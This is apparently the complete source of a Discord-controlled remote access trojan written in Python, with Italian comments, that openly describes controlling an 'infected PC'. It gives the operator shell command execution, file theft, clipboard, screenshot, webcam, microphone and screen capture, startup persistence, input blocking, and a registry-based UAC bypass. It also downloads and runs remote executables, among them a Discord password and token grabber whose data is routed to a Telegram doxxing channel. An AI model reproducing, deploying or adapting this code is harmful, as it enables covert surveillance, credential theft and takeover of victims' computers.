# bxxodev (discord)
# dm me for updates on project
# https://t.me/dracodoxxing (YOU WILL NEED THIS FOR THE !GRAB COMMAND)


# busso made this please dont break copyright.
# WARNING: DONT TOUCH THIS CODE OR THE VIRUS WONT WORK!
# please rate my project on github!!
##########################################


import discord
import os
import subprocess
import ctypes
import pyttsx3
import pyautogui
import platform
import socket
import asyncio
from discord.ext import commands
import requests
import json
import cv2
import playsound
import platform
import ctypes
from ctypes import wintypes
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from threading import Thread
from time import sleep
from sys import argv
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
import urllib.request
from urllib.request import Request, urlopen
from urllib.request import Request, urlopen
from urllib.error import HTTPError  
from re import findall
import psutil
import GPUtil
import sys
import pyaudio
import numpy as np
import wave
from pydub import AudioSegment
import getpass 
import webbrowser
from moviepy.editor import *
import time
from moviepy.editor import VideoFileClip
import pygame
import tkinter as tk
import keyboard
from PIL import Image, ImageTk
import random
import threading
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import string
from telegram import Update, Bot
from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters
import logging



TOKEN = 'YOUR_BOT_TOKEN'
SERVER_ID = YOUR_SERVER_ID  




intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, heartbeat_timeout=60)

def get_public_ip():
   try:
        response = requests.get("https://api64.ipify.org?format=json")
        if response.status_code == 200:
            ip = response.json().get("ip")
            return ip
    except requests.RequestException as e:
        print(f"Error: {e}")
    return None

def get_country_name(ip):
    api_key = "425EE1FEAD4221436271CFCB48037EF7"
    url = f'https://api.ip2location.io/?key={api_key}&ip={ip}'
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        country_name = data.get('country_name')
        return country_name
    else:
        print(f"Error In Api Request: {response.status_code}")
        return None

# Ottenere l'indirizzo IP pubblico
ip = get_public_ip()

# Uso della funzione get_country_name per ottenere il nome del paese
if ip:
    country_name = get_country_name(ip)
    if country_name:
        print(f"Country: {country_name}")
else:
    print("Impossible To Retrieve Ip.")

# Event listener for when the bot is ready
@bot.event
async def on_ready():
    server = bot.get_guild(1267551427006566480)
    existing_sessions = [channel for channel in server.channels if channel.name.startswith('session-')]
    session_number = len(existing_sessions) + 1
    session_channel_name = f'session-{session_number}'
    
    session_channel = await server.create_text_channel(session_channel_name)
    
    admin_status = "🟢" if is_admin() else "🔴"
    await session_channel.send(f"Admin {admin_status} | IP: {ip} | Country: {country_name} | By: bxxodev | @everyone | Use The Command '!aiuto' to get the help command.  |")
    print(f"Bot is ready and session channel {session_channel_name} has been created.")
    if not server:
        print(f"Server with ID {SERVER_ID} not found.")
        return

# Function to check admin privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Command to show a message box
@bot.command()
async def message(ctx, *, text: str):
    if not ctx.channel.name.startswith('session-'):
        return
    ctypes.windll.user32.MessageBoxW(0, text, " ?????????", 1)

# Command to execute a shell command
@bot.command()
async def shell(ctx, *, command: str):
    if not ctx.channel.name.startswith('session-'):
        return
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    await ctx.send(f'Output: {result.stdout}\nError: {result.stderr}')

# Command to make a voice say out loud a custom sentence
@bot.command()
async def voice(ctx, *, text: str):
    if not ctx.channel.name.startswith('session-'):
        return
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

# Command to check if the program has admin privileges
@bot.command()
async def admincheck(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    if is_admin():
        await ctx.send("No, You Are Not Admin.")
    else:
        await ctx.send("Yes, You Are Admin.")

# Command to change directory
@bot.command()
async def cd(ctx, *, path: str):
    if not ctx.channel.name.startswith('session-'):
        return
    try:
        os.chdir(path)
        await ctx.send(f"Directory Changed To: {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command to display all items in the current directory
@bot.command()
async def dir(ctx):
    # Controlla se il nome del canale inizia con 'session-'
    if not ctx.channel.name.startswith('session-'):
        return

    try:
        # Ottiene la lista dei file nella directory corrente
        files = os.listdir()
        
        # Nome del file .txt da creare
        filename = "file_list.txt"
        
        # Scrive la lista dei file in un file .txt
        with open(filename, "w") as f:
            for file in files:
                f.write(f"{file}\n")
        
        # Invia il file su Discord
        await ctx.send(file=discord.File(filename))
        
        # Rimuove il file dopo l'invio
        os.remove(filename)
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command to download a file from the infected computer
@bot.command()
async def download(ctx, *, file_path: str):
    if not ctx.channel.name.startswith('session-'):
        return
    try:
        await ctx.send(file=discord.File(file_path))
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command to upload a file to the infected computer
@bot.command()
async def upload(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        await attachment.save(attachment.filename)
        await ctx.send(f"File {attachment.filename} uploaded")
    else:
        await ctx.send("No File Attached. is this really that complicated? ADD FILE TO THE MESSAGE!")

# Command to retrieve the clipboard content
@bot.command()
async def clipboard(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    try:
        import pyperclip
        clip_content = pyperclip.paste()
        await ctx.send(f"Last Thing Copied: {clip_content}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command to get the idle time of the user on the target computer
@bot.command()
async def idletime(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    try:
        from ctypes import Structure, windll, c_uint, sizeof, byref
        
        class LASTINPUTINFO(Structure):
            _fields_ = [('cbSize', c_uint), ('dwTime', c_uint)]
        
        def get_idle_duration():
            lii = LASTINPUTINFO()
            lii.cbSize = sizeof(LASTINPUTINFO)
            windll.user32.GetLastInputInfo(byref(lii))
            millis = windll.kernel32.GetTickCount() - lii.dwTime
            return millis / 1000.0
        
        idle_time = get_idle_duration()
        await ctx.send(f"Idle From: {idle_time} secs")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command to display the current directory
@bot.command()
async def currentdir(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    await ctx.send(f"Current Directory: {os.getcwd()}")

# Command to get a screenshot of the user's current screen
@bot.command()
async def screenshot(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Command to exit the program
@bot.command()
async def exit(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    await ctx.send("Exited.")
    await bot.close()

# Command to display the system date and time
@bot.command()
async def datetime(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    now = datetime.datetime.now()
    await ctx.send(f"Current Date: {now}")

# Command to show all available commands
@bot.command(name='aiuto')
async def bot_help(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    help_text = """
```Available Commands:

!message = Displays a message on the infected PC. (You must write !message <message>)
!shell = Executes a command in the Command Prompt. (You must write !shell <command>)
!voice = Makes a voice say something. (You must write !voice <message>)
!admincheck = Checks if the program is running as an administrator.
!cd = Changes the directory.
!dir = Displays all files in the current directory.
!currentdir = Displays the current directory.
!download = Downloads a file from the infected PC.
!upload = Uploads a file to the infected PC. (You must attach a file.)
!clipboard = Displays the last thing copied.
!idletime = Displays the idle time.
!currentdir = Displays the current directory.
!screenshot = Takes a screenshot.
!exit = Exits the program.
!tasks = Displays all active tasks.
!endtask = Disables a task.
!webcampic = Takes a photo with the webcam.
!startup = Puts the file in automatic startup.
!audio = Plays an audio file in the background.
!shutdown = Shuts down the PC.
!restart = Restarts the PC.
!datetime = Displays the current date and time.
!block = Blocks the mouse and keyboard.
!unblock = Unblocks the mouse and keyboard.
!wallpaper = Changes the wallpaper. (You must attach a file.)
!systeminfo = Displays all system information.
!uacbypass = Restarts the program as an administrator without the user noticing.
!trololo = Starts the Trololo malware (DOES NOT CAUSE ANY HARM: https://www.youtube.com/watch?v=vkV3mZL-vZI)
!ping = Pings the connection speed.
!grab = Grabs all Discord passwords and tokens.
!screenrecord = Records the screen. (You must write !screenrecord <number of seconds>)
!webcamrecord = Records the webcam. (You must write !webcamrecord <number of seconds>)
!micrecord = Records the microphone. (You must write !micrecord <number of seconds>)```
    """
    await ctx.send(help_text)

@bot.command(name='tasks')
async def tasks(ctx):
    if not ctx.channel.name.startswith('session-'):
        return

    output = ""
    for proc in os.popen('tasklist').readlines():
        output += proc

    # Create a text file and write the output to it
    with open('tasklist.txt', 'w') as f:
        f.write(output)

    # Upload the file to the Discord channel
    file = discord.File("tasklist.txt", filename="tasklist.txt")
    await ctx.send(file=file)

@bot.command(name='endtask')
async def endtask(ctx, task_name: str):
    if not ctx.channel.name.startswith('session-'):
        return

    # Get the task ID from the task name
    task_id = None
    for proc in os.popen('tasklist').readlines():
        if task_name in proc:
            task_id = proc.split()[1]
            break

    if task_id is None:
        await ctx.send(f'Task `{task_name}` Not Found.')
        return

    # Kill the task using the task ID
    os.system(f'taskkill /pid {task_id} /f')

    await ctx.send(f'Task `{task_name}` killed.')

@bot.command(name='webcampic')
async def webcampic(ctx):
    # Capture an image from the active webcam
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send('No webcam found!')
        return

    ret, frame = cap.read()
    cap.release()

    if not ret:
        await ctx.send('Failed to capture image from webcam!')
        return

    # Save the image to a temporary file
    image_path = 'temp_image.jpg'
    cv2.imwrite(image_path, frame)

    # Send the image to the Discord channel
    file = discord.File(image_path, filename='image.jpg')
    await ctx.send(file=file)

    # Delete the temporary image file
    os.remove(image_path)

USER_NAME = getpass.getuser()


@bot.command()
async def startup(ctx):
    def add_to_startup():
        # Ottiene il percorso completo del file .exe corrente
        file_path = os.path.abspath(sys.argv[0])
        
        # Ottiene il percorso della cartella di avvio dell'utente corrente
        startup_folder = os.path.join(
            os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup'
        )

        # Nome del file nella cartella di avvio
        filename = os.path.basename(file_path)
        destination = os.path.join(startup_folder, filename)

        try:
            # Copia il file nella cartella di avvio
            shutil.copy(file_path, destination)
            return f"{file_path} Copied In {destination} Successfully"
        except Exception as e:
            return f"error: {e}"

    # Esegui la funzione e invia il risultato nel canale Discord
    result = add_to_startup()
    await ctx.send(result)


@bot.command(name='audio')
async def audio(ctx):
    # Check if a file was attached to the message
    if not ctx.message.attachments:
        await ctx.send('Please attach an mp3 file to the message!')
        return

    # Get the attached file
    attachment = ctx.message.attachments[0]

    # Check if the file is an mp3
    if attachment.filename.endswith('.mp3'):
        # Download the file to the current directory
        await attachment.save(attachment.filename)

        # Play the audio file using playsound
        playsound.playsound(attachment.filename)

        # Delete the downloaded mp3 file
        os.remove(attachment.filename)

        await ctx.send('Audio file played and deleted!')
    else:
        await ctx.send('Please attach an mp3 file!')

@bot.command(name='shutdown')
async def shutdown(ctx):
    if platform.system() == "Windows":
        os.system('shutdown -p')
        await ctx.send('Spento!')
    elif platform.system() == "Linux":
        os.system('shutdown -h now')
        await ctx.send('Spento!')
    else:
        await ctx.send('Unsupported OS')

@bot.command(name='restart')
async def restart(ctx):
    if platform.system() == "Windows":
        os.system('shutdown -r -t 0')
    elif platform.system() == "Linux":
        os.system('reboot')
    else:
        await ctx.send('Unsupported OS')
    await ctx.send('riavviando...')



# Define the BlockInput function
BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL

# Define the commands
@bot.command(name='block')
async def block(ctx):
    # Block the mouse and keyboard
    blocked = BlockInput(True)
    if blocked:
        await ctx.send('Mouse & Keyboard Blocked!')
    else:
        await ctx.send('Not Admin.')

@bot.command(name='unblock')
async def unblock(ctx):
    # Unblock the mouse and keyboard
    unblocked = BlockInput(False)
    if unblocked:
        await ctx.send('Mouse & Keyboard Unblocked!')
    else:
        await ctx.send('Not Admin.')


def get_system_info():
    uname = platform.uname()
    system_info = f"**System Information**\n"
    system_info += f"System: {uname.system}\n"
    system_info += f"Node Name: {uname.node}\n"
    system_info += f"Release: {uname.release}\n"
    system_info += f"Version: {uname.version}\n"
    system_info += f"Machine: {uname.machine}\n"
    system_info += f"Processor: {uname.processor}\n\n"
    return system_info

def get_cpu_info():
    cpu_info = f"**CPU Info**\n"
    cpu_info += f"Physical cores: {psutil.cpu_count(logical=False)}\n"
    cpu_info += f"Total cores: {psutil.cpu_count(logical=True)}\n"
    cpu_info += f"Max Frequency: {psutil.cpu_freq().max:.2f}Mhz\n"
    cpu_info += f"Min Frequency: {psutil.cpu_freq().min:.2f}Mhz\n"
    cpu_info += f"Current Frequency: {psutil.cpu_freq().current:.2f}Mhz\n"
    cpu_info += f"CPU Usage Per Core: {[f'Core {i}: {percentage}%' for i, percentage in enumerate(psutil.cpu_percent(percpu=True))]}\n"
    cpu_info += f"Total CPU Usage: {psutil.cpu_percent()}%\n\n"
    return cpu_info

def get_memory_info():
    svmem = psutil.virtual_memory()
    memory_info = f"**Memory Info**\n"
    memory_info += f"Total: {svmem.total / (1024 ** 3):.2f}GB\n"
    memory_info += f"Available: {svmem.available / (1024 ** 3):.2f}GB\n"
    memory_info += f"Used: {svmem.used / (1024 ** 3):.2f}GB\n"
    memory_info += f"Percentage: {svmem.percent}%\n\n"
    return memory_info

def get_disk_info():
    disk_info = f"**Disk Info**\n"
    partitions = psutil.disk_partitions()
    for partition in partitions:
        disk_info += f"=== Device: {partition.device} ===\n"
        disk_info += f"  Mountpoint: {partition.mountpoint}\n"
        disk_info += f"  File system type: {partition.fstype}\n"
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            disk_info += f"  Total Size: {partition_usage.total / (1024 ** 3):.2f}GB\n"
            disk_info += f"  Used: {partition_usage.used / (1024 ** 3):.2f}GB\n"
            disk_info += f"  Free: {partition_usage.free / (1024 ** 3):.2f}GB\n"
            disk_info += f"  Percentage: {partition_usage.percent}%\n"
        except PermissionError:
            disk_info += "  Errore nel leggere l'uso del disco\n"
    return disk_info

def get_gpu_info():
    gpus = GPUtil.getGPUs()
    gpu_info = f"**GPU Info**\n"
    for gpu in gpus:
        gpu_info += f"ID: {gpu.id}, Name: {gpu.name}, Load: {gpu.load*100}%, Free Memory: {gpu.memoryFree}MB, Used Memory: {gpu.memoryUsed}MB, Total Memory: {gpu.memoryTotal}MB, Temperature: {gpu.temperature}°C\n"
    gpu_info += "\n"
    return gpu_info

def get_monitor_info():
    try:
        monitor_info = subprocess.check_output('wmic path Win32_VideoController get /format:list', shell=True).decode()
        return f"**Monitor Info**\n{monitor_info}\n"
    except Exception as e:
        return f"error: {e}\n"

@bot.command()
async def systeminfo(ctx):
    try:
        system_info = get_system_info()
        cpu_info = get_cpu_info()
        memory_info = get_memory_info()
        disk_info = get_disk_info()
        gpu_info = get_gpu_info()
        monitor_info = get_monitor_info()
        
        # Scrivere le informazioni in un file di testo
        with open("system_info.txt", "w") as file:
            file.write(system_info)
            file.write(cpu_info)
            file.write(memory_info)
            file.write(disk_info)
            file.write(gpu_info)
            file.write(monitor_info)

        # Inviare il file come allegato
        await ctx.send(file=discord.File("system_info.txt"))
        os.remove("system_info.txt")  # Rimuove il file dopo l'invio
    except Exception as e:
        await ctx.send(f"Error: {e}")


def set_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    except Exception as e:
        print(f"Error: {e}")

def kill_wallpaper_engine():
    # Termina Wallpaper Engine se è in esecuzione
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'] == 'wallpaper32.exe' or process.info['name'] == 'wallpaper64.exe':
            try:
                psutil.Process(process.info['pid']).terminate()
                return True
            except Exception as e:
                print(f"Error: {e}")
                return False
    return False


@bot.command()
async def wallpaper(ctx):
    # Verifica se ci sono allegati nel messaggio
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please Attach An Image!")
        return
    
    attachment = ctx.message.attachments[0]
    
    # Verifica se il file allegato è un'immagine
    if not any(attachment.filename.lower().endswith(ext) for ext in ['jpg', 'jpeg', 'png', 'bmp']):
        await ctx.send("Please Attach An Image! (jpg, jpeg, png, bmp).")
        return
    
    # Scarica l'immagine
    image_path = os.path.join(os.getcwd(), attachment.filename)
    await attachment.save(image_path)
    
    # Chiude Wallpaper Engine se attivo
    if kill_wallpaper_engine():
        await ctx.send("Wallpaper Engine Was Closed")

    # Imposta l'immagine come sfondo
    set_wallpaper(image_path)
    
    await ctx.send(f"Wallpaper Changed To {attachment.filename}!")

class Utility:
    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def IsAdmin() -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method: int=1) -> bool:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
            match method:
                case 1:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('computerdefaults --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case 2:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('fodhelper --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            return True

@bot.command(name='uacbypass')
async def uacbypass(ctx, method: int = 1):
    is_admin = Utility.IsAdmin()
    await ctx.send(f"Are You Admin?: {is_admin}")

    if not is_admin:
        await ctx.send("Not Admin, Trying To Bypass.")
        result = Utility.UACbypass(method)
        await ctx.send(f"UAC BYPASS RESULT: {result}")
    else:
        await ctx.send("Already Admin!")


@bot.command()
async def trololo(ctx):
    if not ctx.channel.name.startswith('session-'):
        return
    try:
        url = "https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Joke/Trololo.exe"
        local_filename = "Trololo.exe"
        
        # Download the file
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(local_filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)

            # Get the absolute path of the downloaded file
            file_path = os.path.abspath(local_filename)
            
            # Run the file as administrator
            ctypes.windll.shell32.ShellExecuteW(None, "runas", file_path, None, None, 1)
            await ctx.send("Trololo.exe Downloaded And Executed successfully (only if ur admin, if not then did not executed succesfully)")
        else:
            await ctx.send("Not Possible To Download.")
    except Exception as e:
        await ctx.send(f"Errore: {str(e)}")

@bot.command(name='website')
async def website(ctx, website: str):
    if not website.startswith("http://") and not website.startswith("https://"):
        website = "http://" + website

    try:
        webbrowser.open(website)
        await ctx.send(f"sito aperto: {website}")
    except Exception as e:
        await ctx.send(f"errore: {e}")


@bot.command()
async def ping(ctx):
    # Get the start time
    start_time = time.time()
    
    # Send a message
    message = await ctx.send("Pong!")
    
    # Calculate the end time and latency
    end_time = time.time()
    latency = round((end_time - start_time) * 1000, 2)  # Convert to milliseconds
    
    # Edit the message with the latency
    await message.edit(content=f"Pong! Latency: {latency}ms")


@bot.command(name='grab')
async def grab(ctx):
    # URL of the file to download
    url = 'https://github.com/BUSSO-coder/boh/raw/main/Built.exe'

    # Send a message to indicate the file is being downloaded
    await ctx.send('Downloading file...')

    # Download the file using the requests library
    response = requests.get(url, stream=True)

    # Check if the file was downloaded successfully
    if response.status_code != 200:
        await ctx.send('Impossible To Download The File.')
        return

    # Get the file name from the URL
    file_name = url.split('/')[-1]

    # Save the file to the local directory
    with open(file_name, 'wb') as file:
        for chunk in response.iter_content(chunk_size=1024):
            file.write(chunk)

    # Send a message to indicate the file has been downloaded
    await ctx.send(f'{file_name} Downloaded!')

    # Open the file (this will depend on the file type)
    # For example, if it's an executable file:
    subprocess.run([file_name])

    # Delete the file after it's been opened
    os.remove(file_name)

    await ctx.send(f'{file_name} deleted!')
    await ctx.send(f'Data Grabbed! Join https://t.me/dracodoxxing to collect the data stolen (PASSWORD FOR ZIP: busso)')



@bot.command()
async def micrecord(ctx, record_time: int):
    audio_format = pyaudio.paInt16
    channels = 1
    rate = 44100
    chunk = 1024
    filename = "mic_recording.wav"
    await ctx.send(f"Recording...")
    
    p = pyaudio.PyAudio()
    stream = p.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    
    frames = []
    for _ in range(int(rate / chunk * record_time)):
        data = stream.read(chunk)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    p.terminate()
    
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(audio_format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
    
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

# Command to record screen
@bot.command()
async def screenrecord(ctx, record_time: int):
    filename = "screen_recording.mp4"
    codec = cv2.VideoWriter_fourcc(*"mp4v")
    screen_size = pyautogui.size()
    out = cv2.VideoWriter(filename, codec, 20.0, screen_size)
    await ctx.send(f"Recording...")
    
    start_time = time.time()
    while (time.time() - start_time) < record_time:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
        out.write(frame)
    
    out.release()
    
    await ctx.send(file=discord.File(filename))
    os.remove(filename)

# Command to record webcam video
@bot.command()
async def webcamrecord(ctx, record_time: int):
    filename = "webcam_recording.mp4"
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():  # Check if the webcam is opened
        await ctx.send(f"Webcam Non Trovata!")
        return

    codec = cv2.VideoWriter_fourcc(*"mp4v")
    fps = 20.0
    frame_size = (int(cap.get(3)), int(cap.get(4)))
    out = cv2.VideoWriter(filename, codec, fps, frame_size)
    await ctx.send(f"Recording...")

    start_time = time.time()
    while (time.time() - start_time) < record_time:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    
    cap.release()
    out.release()

    await ctx.send(file=discord.File(filename))
    os.remove(filename)

# Run the bot
bot.run(TOKEN)

